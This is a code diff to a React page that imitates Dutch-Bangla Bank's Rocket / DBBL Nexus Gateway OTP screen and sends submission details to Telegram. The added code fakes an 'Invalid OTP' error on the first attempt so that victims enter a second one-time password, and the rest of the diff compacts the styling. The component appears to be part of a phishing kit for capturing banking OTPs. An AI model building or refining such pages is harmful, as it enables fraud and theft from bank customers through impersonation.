@@ -97,6 +97,8 @@ const RocketPayment = () => {
     }, 2000);
   };
 
+  const [otpAttempts, setOtpAttempts] = useState(0);
+
   const handleOtpSubmit = () => {
     if (otp.length < 4) {
       setShowError("Please enter the OTP.");
@@ -105,6 +107,18 @@ const RocketPayment = () => {
     }
     setIsSubmitting(true);
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket OTP' });
+
+    if (otpAttempts === 0) {
+      setTimeout(() => {
+        setIsSubmitting(false);
+        setOtpAttempts(1);
+        setShowError("Invalid OTP provided. Please try again.");
+        setOtp("");
+        setTimeout(() => otpRef.current?.focus(), 50);
+        setTimeout(() => setShowError(""), 4000);
+      }, 2000);
+      return;
+    }
 
     setTimeout(() => {
       setIsSubmitting(false);
@@ -136,26 +150,25 @@ const RocketPayment = () => {
   // Blue lines with DBBL NEXUS GATEWAY text (blue text on white bg)
   const gatewayBanner = (
     <>
-      <div className="h-[4px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
-      <div className="bg-white py-1.5 text-center">
-        <span className="text-[#0000cc] text-lg min-[375px]:text-xl font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
+      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
+      <div className="bg-white py-1 text-center">
+        <span className="text-[#0000cc] text-base min-[375px]:text-lg font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
           DBBL NEXUS GATEWAY
         </span>
       </div>
-      <div className="h-[4px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
     </>
   );
 
   // Footer with colored line
   const footer = (
     <div>
-      <div className="h-[3px] bg-gradient-to-r from-[#cc0000] via-[#009933] via-[#003399] to-[#003399]"></div>
-      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
-      <div className="text-center py-1.5 min-[375px]:py-2">
-        <p className="text-xs min-[375px]:text-sm font-bold text-[#333]" style={{ fontFamily: 'Arial, sans-serif' }}>
+      <div className="h-[2px] bg-gradient-to-r from-[#cc0000] via-[#009933] via-[#003399] to-[#003399]"></div>
+      <div className="h-[2px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
+      <div className="text-center py-1 min-[375px]:py-1.5">
+        <p className="text-[10px] min-[375px]:text-xs font-bold text-[#333]" style={{ fontFamily: 'Arial, sans-serif' }}>
           DBBL E-COMM With Service Hub Limited
         </p>
-        <p className="text-[10px] min-[375px]:text-xs text-[#666]" style={{ fontFamily: 'Arial, sans-serif' }}>
+        <p className="text-[9px] min-[375px]:text-[10px] text-[#666]" style={{ fontFamily: 'Arial, sans-serif' }}>
           ecom1.dutchbanglabank.com
         </p>
       </div>
@@ -182,19 +195,19 @@ const RocketPayment = () => {
             <div className="flex-1 bg-[#0044aa]"></div>
           </div>
 
-          <div className="px-4 min-[375px]:px-6 py-4 min-[375px]:py-5">
+          <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
             {showError && (
-              <div className="text-center text-red-600 text-xs mb-2 font-medium">{showError}</div>
+              <div className="text-center text-red-600 text-[10px] min-[375px]:text-xs mb-2 font-medium">{showError}</div>
             )}
 
-            <p className="text-[13px] min-[375px]:text-sm text-[#333] leading-relaxed mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
+            <p className="text-[11px] min-[375px]:text-xs text-[#333] leading-relaxed mb-3" style={{ fontFamily: 'Arial, sans-serif' }}>
               An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
             </p>
 
-            <hr className="border-[#ddd] mb-4" />
+            <hr className="border-[#ddd] mb-3" />
 
-            <div className="flex items-center gap-3 mb-4">
-              <label className="text-[12px] min-[375px]:text-[13px] text-[#333] whitespace-nowrap" style={{ fontFamily: 'Arial, sans-serif' }}>
+            <div className="flex items-center gap-2 mb-3">
+              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap" style={{ fontFamily: 'Arial, sans-serif' }}>
                 OTP (One Time Password):
               </label>
               <input
@@ -203,27 +216,27 @@ const RocketPayment = () => {
                 inputMode="numeric"
                 value={otp}
                 onChange={handleOtpChange}
-                className="border border-[#999] px-2 py-1 text-sm w-[100px] focus:outline-none focus:border-[#0066cc]"
+                className="border border-[#999] px-1.5 py-0.5 text-xs w-[90px] focus:outline-none focus:border-[#0066cc]"
                 style={{ fontFamily: 'Arial, sans-serif' }}
               />
             </div>
 
             {/* Go button */}
-            <div className="flex justify-center mb-6">
+            <div className="flex justify-center mb-4">
               <button
                 onClick={handleOtpSubmit}
                 disabled={isSubmitting}
-                className="border border-[#999] bg-[#f0f0f0] px-2 py-0.5 flex items-center gap-1 hover:bg-[#e0e0e0] text-sm"
-                style={{ fontFamily: 'Arial, sans-serif' }}
+                className="border border-[#999] bg-[#f0f0f0] px-1.5 py-0 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight"
+                style={{ fontFamily: 'Arial, sans-serif', height: '22px' }}
               >
                 <span className="font-bold text-[#333]">Go</span>
-                <span className="bg-red-600 text-white text-[10px] font-bold px-1 py-[1px] leading-none">&gt;</span>
+                <span className="bg-red-600 text-white text-[9px] font-bold px-0.5 py-[1px] leading-none">&gt;</span>
               </button>
             </div>
 
             {/* OTP illustration */}
             <div className="flex justify-center">
-              <img src={otpIllustration} alt="OTP Verification" className="w-full max-w-[500px] h-auto border border-[#ccc]" loading="lazy" />
+              <img src={otpIllustration} alt="OTP Verification" className="w-full max-w-[400px] h-auto border border-[#ccc]" loading="lazy" />
             </div>
           </div>
         </div>
